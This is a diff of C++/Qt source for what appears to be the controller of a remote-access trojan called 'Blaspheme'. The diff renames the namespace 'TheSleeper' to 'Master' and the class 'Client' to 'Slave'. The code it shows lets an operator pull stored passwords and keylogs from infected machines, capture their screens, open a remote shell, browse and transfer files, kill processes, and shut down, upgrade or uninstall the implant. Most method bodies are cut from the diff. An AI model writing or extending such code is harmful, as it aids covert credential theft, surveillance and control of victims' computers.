@@ -6,13 +6,13 @@ using namespace std;
 #include <QWaitCondition>
 #include <QTextStream>
 #include <QMessageBox>
-#include "Client.hpp"
+#include "Slave.hpp"
 #include <common/Log.hpp>
 #include <system/File.hpp>
 #include <blaspheme/Blaspheme.hpp>
 using namespace Blaspheme;
 
-namespace TheSleeper
+namespace Master
 {
     QWaitCondition stream_associated;
     QMutex stream_mutex;
@@ -26,24 +26,24 @@ namespace TheSleeper
             }
     };
     
-	Client::Client(Blaspheme::Session _session, QObject * parent)
+	Slave::Slave(Blaspheme::Session _session, QObject * parent)
 		:session(_session), QObject(parent)
 	{
 		status = tr("Online");
-		updateClientName();
+		updateSlaveName();
 		updateSystemVersion();
 		updatePasswords();
 		updateLogicalVolumes();
 	}
 
-    void Client::disconnect()
+    void Slave::disconnect()
     {
 		LOG << "Resetting connexions";
 		session.reset();
 		status = tr("Deconnected");
 	}
 
-    QString Client::getRemoteSystemVersion()
+    QString Slave::getRemoteSystemVersion()
     {
         try
         {
@@ -65,67 +65,67 @@ namespace TheSleeper
 		return "Undefined OS Version";
     }
 
-	QStandardItemModel& Client::getRemoteFileTree()
+	QStandardItemModel& Slave::getRemoteFileTree()
 	{
 		return remote_files;
 	}
 
-	QStringList& Client::getStoredPasswords()
+	QStringList& Slave::getStoredPasswords()
 	{
 		return stored_passwords;
 	}
 
-	void Client::addStream(Network::TcpClient new_stream)
+	void Slave::addStream(Network::TcpClient new_stream)
 	{
 		session.pushStream(new_stream);
 	}
 
-	Blaspheme::SessionId Client::getUniqueId()
+	Blaspheme::SessionId Slave::getUniqueId()
 	{
 		return session.getId();
 	}
 
-    QString Client::getIp()
+    QString Slave::getIp()
 	{
 		return session.stream().getIp().c_str();
 	}
 
-    QString Client::getPort()
+    QString Slave::getPort()
 	{
 		return QString::number(session.stream().getPort());
 	}
 
-    QString Client::getStatus()
+    QString Slave::getStatus()
 	{
 		return status;
 	}
 
-    QString Client::getName()
+    QString Slave::getName()
 	{
 		return name;
 	}
 
-    QString Client::getSystemVersion()
+    QString Slave::getSystemVersion()
 	{
 		return system_version;
 	}
 
-    const QString& Client::getKeylog()
+    const QString& Slave::getKeylog()
 	{
 		return current_keylog;
 	}
 
-    QPixmap& Client::getScreen()
+    QPixmap& Slave::getScreen()
 	{
 		return screen;
 	}
 
-	QStringList& Client::getProcessList()
+	QStringList& Slave::getProcessList()
 	{
 		return processes;
 	}
 
-    void Client::updateProcessList()
+    void Slave::updateProcessList()
     {
         try
         {
@@ -160,7 +160,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::killProcess(QString process)
+    void Slave::killProcess(QString process)
     {
         try
         {
@@ -190,7 +190,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::remoteShell()
+    void Slave::remoteShell()
     {
         try
         {
@@ -227,7 +227,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::updateScreen(int quality, QProgressBar * bar)
+    void Slave::updateScreen(int quality, QProgressBar * bar)
     {
         try
         {
@@ -271,7 +271,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::remoteShutdown()
+    void Slave::remoteShutdown()
     {
         try
         {
@@ -288,7 +288,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::remoteReboot()
+    void Slave::remoteReboot()
     {
         try
         {
@@ -304,7 +304,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::remoteLogout()
+    void Slave::remoteLogout()
     {
         try
         {
@@ -321,7 +321,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::remoteHibernate()
+    void Slave::remoteHibernate()
     {
         try
         {
@@ -338,7 +338,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::reboot()
+    void Slave::reboot()
     {
         try
         {
@@ -355,7 +355,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::shutdown()
+    void Slave::shutdown()
     {
         try
         {
@@ -372,7 +372,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::upgrade(QString server_filename, QProgressBar * bar)
+    void Slave::upgrade(QString server_filename, QProgressBar * bar)
     {
         try
         {
@@ -406,7 +406,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::uninstall()
+    void Slave::uninstall()
     {
         try
         {
@@ -419,7 +419,7 @@ namespace TheSleeper
         emit disconnected();
     }
 
-    void Client::updateKeylog(QProgressBar * bar)
+    void Slave::updateKeylog(QProgressBar * bar)
     {
         remove(LOG_PATH_DOWNLOAD);
         try
@@ -465,7 +465,7 @@ namespace TheSleeper
         }
     }
 
-    QStandardItemModel& Client::updateLogicalVolumes()
+    QStandardItemModel& Slave::updateLogicalVolumes()
     {
         try
         {
@@ -502,11 +502,11 @@ namespace TheSleeper
 		return remote_files;
     }
 
-    bool Client::browseFiles(QModelIndex current_index)
+    bool Slave::browseFiles(QModelIndex currentIndex)
     {
         try
         {
-            QString file = remote_files.data(current_index).toString();
+            QString file = remote_files.data(currentIndex).toString();
             if(!file.size())
                 return true;
 
@@ -518,20 +518,20 @@ namespace TheSleeper
             }
             
             // c'est un dossier mais a-t-il déja été listé ?
-            if(remote_files.hasChildren(current_index))
+            if(remote_files.hasChildren(currentIndex))
             {
                 LOG << "Directory is already lin list";
                 return true;
             }
             
-            QString path = getRemotePath(current_index);
+            QString path = getRemotePath(currentIndex);
             LOG << "Directory to list : " + path.toStdString();
             
             session << BROWSE_FILES;
             session << path.toStdString();
             string listing;
             
-            QStandardItem * current_item = remote_files.itemFromIndex(current_index);
+            QStandardItem * current_item = remote_files.itemFromIndex(currentIndex);
             QList<QStandardItem *> item_list;
             
             for(;;)
@@ -576,9 +576,9 @@ namespace TheSleeper
 		return true;
     }
 
-    QString Client::getRemotePath(QModelIndex current_index)
+    QString Slave::getRemotePath(QModelIndex currentIndex)
     {
-        QModelIndex current = current_index;
+        QModelIndex current = currentIndex;
         QString path;
         while(current != QModelIndex())
         {
@@ -588,7 +588,7 @@ namespace TheSleeper
         return path;
     }
 
-    void Client::startDownload(QString& source, QString& destination, QProgressBar * bar)
+    void Slave::startDownload(QString& source, QString& destination, QProgressBar * bar)
     {
         try
         {
@@ -616,7 +616,7 @@ namespace TheSleeper
         }
     }
 
-    void Client::startUpload(QString& source, QString& destination, QProgressBar * bar)
+    void Slave::startUpload(QString& source, QString& destination, QProgressBar * bar)
     {
         try
         {
@@ -644,7 +644,7 @@ namespace TheSleeper
         }
     }
 
-	void Client::updateSystemVersion()
+	void Slave::updateSystemVersion()
 	{
 		session << GET_WINDOWS_VERSION;
 		string buffer;
@@ -653,7 +653,7 @@ namespace TheSleeper
 		LOG << "Operating System version : " + buffer;
 	}
 
-	void Client::updateClientName()
+	void Slave::updateSlaveName()
 	{
 		session << GET_CLIENT_NAME;        
 		LOG << "Waiting for slave name";
@@ -663,7 +663,7 @@ namespace TheSleeper
 		LOG << "Slave name : " + buffer;
 	}
 
-	void Client::updatePasswords()
+	void Slave::updatePasswords()
 	{
 		session << PASSWORDS_GETALL;
 		LOG << "Waiting for passwords";
@@ -683,4 +683,4 @@ namespace TheSleeper
 		}		
 	}
 
-} /* TheSleeper */
+} // Master
